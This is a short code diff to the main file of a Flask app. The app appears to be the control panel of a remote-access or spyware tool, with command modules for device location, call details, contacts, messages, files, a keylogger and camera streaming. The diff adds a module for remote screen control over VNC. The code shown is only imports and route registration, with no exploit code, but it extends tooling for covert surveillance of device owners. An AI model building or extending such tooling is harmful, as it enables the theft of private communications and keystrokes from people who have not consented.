@@ -10,7 +10,7 @@ from dotenv import load_dotenv
 from flask_wtf.csrf import CSRFProtect, CSRFError
 from datetime import timedelta
 from user.routes import auth, dashboard, devices
-from user.routes.commands import location, call_details, contacts, device_info, messages, apps, file_manager, keylogger, stream_camera
+from user.routes.commands import location, call_details, contacts, device_info, messages, apps, file_manager, keylogger, stream_camera, stream_vnc
 import os
 from config.database import init_app, db
 from utils.filters import init_filters
@@ -67,6 +67,7 @@ app.register_blueprint(apps.apps_command)
 app.register_blueprint(file_manager.file_manager_command)
 app.register_blueprint(keylogger.keylogger_command)
 app.register_blueprint(stream_camera.stream_camera_bp)
+app.register_blueprint(stream_vnc.stream_vnc_bp)
  
 if __name__ == '__main__':
     with app.app_context():
